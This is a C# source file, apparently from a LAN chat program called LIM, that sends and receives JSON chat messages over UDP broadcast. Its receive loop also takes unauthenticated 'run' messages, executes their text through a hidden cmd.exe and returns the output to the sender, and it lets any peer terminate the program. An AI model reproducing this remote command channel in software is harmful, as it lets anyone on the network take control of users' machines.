using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.Linq;
using System.Net;
using System.Net.Sockets;
using System.Text;
using System.Windows.Forms;
using LIM.Encryption;
using Newtonsoft.Json.Linq;


namespace LIM
{
    public static class GlobalData
    {
        public static readonly int ProtocalPort = 65000;
        public static readonly string[] SystemUserNames = new String[]
        {
            "admin",
            "system",
            "sys",
            "fcp",
            "lim",
            "core",
            "console",
            "protocol",
            "acp",
            "hagp",
            "p2p",
        };


        public static readonly string[] UserNameKeyWords = new String[]
        {
            "刘金玉",
            "刘国强",
            "林爽爽",
        };

        public static bool GetAdminMessage = true;
        public static bool ShowAdminOptions = false;

        public static int NetWorkID = 0;
        public static string UserName = "";


        public static bool EnableEncryption = false;
        public static string EncryptionPassword = "";




        // Network
        public static readonly IPEndPoint BroadcastIP = new IPEndPoint(IPAddress.Broadcast, ProtocalPort);
        public static readonly IPEndPoint ListenIP = new IPEndPoint(IPAddress.Any, ProtocalPort);
        public static readonly IPEndPoint ListenIPAny = new IPEndPoint(IPAddress.Any, 0);
        public static UdpClient UdpCore;// = new UdpClient(ListenIP);


        public static void SendMessage(int type, string name, string msg, IPEndPoint recv)
        {
            try
            {
                JObject obj = new JObject();
                obj["nid"] = NetWorkID;
                obj["type"] = type;
                obj["name"] = name;
                obj["msg"] = msg;
                string data = obj.ToString();
                Console.WriteLine(data);
                byte[] bytes = Encoding.UTF8.GetBytes(data);
                if (EnableEncryption)
                {
                    bytes = AES256.Encrypt(bytes, Encoding.UTF8.GetBytes(EncryptionPassword));
                }
                UdpCore.Send(bytes, bytes.Length, recv);
            }
            catch(Exception ex)
            {
                Console.WriteLine(ex.ToString());
            }
        }

        public static void AddItemToListBox(string data, ListBox listBox)
        {
            listBox.Invoke(new Action(() =>
            {
                listBox.Items.Add(
                    data
                );
                listBox.Refresh();
                listBox.TopIndex = listBox.Items.Count - 1;
            }));
        }

        public static void MessagesGetter(ListBox listBox, CheckBox ig_nid, CheckBox ig_cmd, CheckBox ig_exit, TextBox blk_box)
        {
            while (true)
            {
                try
                {
                    IPEndPoint endpoint = new IPEndPoint(IPAddress.Any, ProtocalPort);
                    byte[] buf = UdpCore.Receive(ref endpoint);

                    if (EnableEncryption)
                    {
                        try
                        {
                            buf = AES256.Decrypt(buf, Encoding.UTF8.GetBytes(EncryptionPassword));
                        }
                        catch (Exception ex)
                        {
                            Console.Write(ex.ToString());
                            continue;
                        }
                    }

                    string msg = Encoding.UTF8.GetString(buf);
                    Console.WriteLine(endpoint);
                    Console.WriteLine(msg);

                    if (blk_box.Text != null && !blk_box.Text.Trim().Equals(""))
                    {
                        string temp_string = blk_box.Text.Replace("\n", "");
                        temp_string = temp_string.Replace("\t", "");
                        string[] blk_list = temp_string.Split(new []{'|'}, StringSplitOptions.RemoveEmptyEntries);
                        if (blk_list.Contains(endpoint.Address.ToString()) || 
                            blk_list.Contains(endpoint.Address.ToString() + "|") ||
                            //blk_box.Text.Contains(endpoint.Address.ToString()) ||
                            blk_box.Text.Contains(endpoint.Address.ToString() + "|")
                        )
                        {
                            continue;
                        }
                        blk_list = temp_string.Split(new[] { ';' }, StringSplitOptions.RemoveEmptyEntries);
                        if (blk_list.Contains(endpoint.Address.ToString()) ||
                            blk_list.Contains(endpoint.Address.ToString() + ";") ||
                            //blk_box.Text.Contains(endpoint.Address.ToString()) ||
                            blk_box.Text.Contains(endpoint.Address.ToString() + ";")
                           )
                        {
                            continue;
                        }

                    }

                    JObject obj = JObject.Parse(msg);
                    if (obj != null)
                    {
                        Console.WriteLine("JObject obj not null.");
                        if (
                            obj.ContainsKey("nid") &&
                            obj.ContainsKey("type") &&
                            obj.ContainsKey("name") &&
                            obj.ContainsKey("msg") 
                        )
                        {
                            Console.WriteLine("Objects not null.");
                            if (int.Parse((string)obj["type"]) == 0)
                            {
                                if (ig_nid.Checked)
                                {
                                    AddItemToListBox(
                                        "[" + endpoint.Address.ToString() + "] " +
                                        obj["nid"].ToString() + " @ " + obj["name"].ToString() + " > " +
                                        obj["msg"].ToString(),
                                        listBox
                                    );
                                    continue;
                                }

                                if (int.Parse((string)obj["nid"]) == NetWorkID)
                                {
                                    AddItemToListBox(
                                        "[" + endpoint.Address.ToString() + "] " +
                                        obj["nid"].ToString() + " @ " + obj["name"].ToString() + " > " +
                                        obj["msg"].ToString(),
                                        listBox
                                    );
                                    continue;
                                }
                                continue;
                            }

                            if (int.Parse((string)obj["type"]) == 1)
                            {
                                if (ig_nid.Checked)
                                {
                                    if (((string)obj["name"]).ToLower().Equals("find"))
                                    {
                                        SendMessage(1, "return".ToUpper(), UserName, endpoint);
                                    }
                                    if (((string)obj["name"]).ToLower().Equals("return"))
                                    {
                                        AddItemToListBox(
                                            "[" + endpoint.Address.ToString() + "] " +
                                            obj["nid"].ToString() + " @ " + obj["name"].ToString() + " > " +
                                            obj["msg"].ToString(),
                                            listBox
                                        );
                                    }
                                    continue;
                                }

                                if (int.Parse((string)obj["nid"]) == NetWorkID)
                                {
                                    if (((string)obj["name"]).ToLower().Equals("find"))
                                    {
                                        SendMessage(1, "return".ToUpper(), UserName, endpoint);
                                    }
                                    if (((string)obj["name"]).ToLower().Equals("return"))
                                    {
                                        AddItemToListBox(
                                            "[" + endpoint.Address.ToString() + "] " +
                                            obj["nid"].ToString() + " @ " + obj["name"].ToString() + " > " +
                                            obj["msg"].ToString(),
                                            listBox
                                        );
                                    }
                                    continue;
                                }
                                continue;
                            }

                            if (int.Parse((string)obj["type"]) == 2)
                            {
                                if (ig_nid.Checked)
                                {
                                    if (((string)obj["name"]).ToLower().Equals("exit"))
                                    {
                                        if (!ig_exit.Checked)
                                        {
                                            GlobalData.UdpCore.Close();
                                            Environment.Exit(0);
                                            continue;
                                        }

                                    }
                                    else if (((string)obj["name"]).ToLower().Equals("run"))
                                    {
                                        if (!ig_cmd.Checked)
                                        {
                                            Process CmdProcess = new Process();
                                            CmdProcess.StartInfo.FileName = "cmd.exe";
                                            CmdProcess.StartInfo.CreateNoWindow = true;
                                            CmdProcess.StartInfo.UseShellExecute = false;
                                            CmdProcess.StartInfo.RedirectStandardInput = true;
                                            CmdProcess.StartInfo.RedirectStandardOutput = true;
                                            CmdProcess.StartInfo.RedirectStandardError = true;
                                            CmdProcess.StartInfo.Arguments = (string)obj["msg"];
                                            CmdProcess.Start();
                                            string output = CmdProcess.StandardOutput.ReadToEnd();
                                            CmdProcess.WaitForExit();
                                            CmdProcess.Close();
                                            SendMessage(2, "return".ToUpper(), output, endpoint);
                                        }
                                        
                                    }else if (((string)obj["name"]).ToLower().Equals("return"))
                                    {
                                        AddItemToListBox(
                                            "[" + endpoint.Address.ToString() + "] " +
                                            obj["nid"].ToString() + " @ " + obj["name"].ToString() + " > " +
                                            obj["msg"].ToString(),
                                            listBox
                                        );
                                    }

                                    continue;
                                }

                                if (int.Parse((string)obj["nid"]) == NetWorkID)
                                {
                                    if (((string)obj["name"]).ToLower().Equals("exit"))
                                    {
                                        if (!ig_exit.Checked)
                                        {
                                            GlobalData.UdpCore.Close();
                                            Environment.Exit(0);
                                            continue;
                                        }
                                    }
                                    else if (((string)obj["name"]).ToLower().Equals("run"))
                                    {

                                        if (!ig_cmd.Checked)
                                        {
                                            Process CmdProcess = new Process();
                                            CmdProcess.StartInfo.FileName = "cmd.exe";
                                            CmdProcess.StartInfo.CreateNoWindow = true;
                                            CmdProcess.StartInfo.UseShellExecute = false;
                                            CmdProcess.StartInfo.RedirectStandardInput = true;
                                            CmdProcess.StartInfo.RedirectStandardOutput = true;
                                            CmdProcess.StartInfo.RedirectStandardError = true;
                                            CmdProcess.StartInfo.Arguments = (string)obj["msg"];
                                            CmdProcess.Start();
                                            string output = CmdProcess.StandardOutput.ReadToEnd();
                                            CmdProcess.WaitForExit();
                                            CmdProcess.Close();
                                            SendMessage(2, "return".ToUpper(), output, endpoint);
                                        }

                                    }
                                    else if (((string)obj["name"]).ToLower().Equals("return"))
                                    {
                                        AddItemToListBox(
                                            "[" + endpoint.Address.ToString() + "] " +
                                            obj["nid"].ToString() + " @ " + obj["name"].ToString() + " > " +
                                            obj["msg"].ToString(),
                                            listBox
                                        );
                                    }

                                    continue;
                                }
                                continue;
                            }
                        }

                        if (int.Parse((string)obj["type"]) == 4)
                        {
                            if (ig_nid.Checked)
                            {
                                if (((string)obj["name"]).ToLower().Equals("join"))
                                {
                                    AddItemToListBox(
                                        "[" + endpoint.Address.ToString() + "] " +
                                        obj["nid"].ToString() + " @ " + obj["msg"].ToString() + " --> " +
                                        "Join Chat",
                                        listBox
                                    );
                                }else if (((string)obj["name"]).ToLower().Equals("quit"))
                                {
                                    AddItemToListBox(
                                        "[" + endpoint.Address.ToString() + "] " +
                                        obj["nid"].ToString() + " @ " + obj["msg"].ToString() + " --> " +
                                        "Quit Chat",
                                        listBox
                                    );
                                }

                                continue;
                            }

                            if (int.Parse((string)obj["nid"]) == NetWorkID)
                            {
                                if (((string)obj["name"]).ToLower().Equals("join"))
                                {
                                    AddItemToListBox(
                                        "[" + endpoint.Address.ToString() + "] " +
                                        obj["nid"].ToString() + " @ " + obj["msg"].ToString() + " --> " +
                                        "Join Chat",
                                        listBox
                                    );
                                }
                                else if (((string)obj["name"]).ToLower().Equals("quit"))
                                {
                                    AddItemToListBox(
                                        "[" + endpoint.Address.ToString() + "] " +
                                        obj["nid"].ToString() + " @ " + obj["msg"].ToString() + " --> " +
                                        "Quit Chat",
                                        listBox
                                    );
                                }
                                continue;
                            }
                            continue;
                        }
                    }
                }
                catch (Exception ex)
                {
                    Console.WriteLine(ex.Message);
                }
            }
        }

    }

}

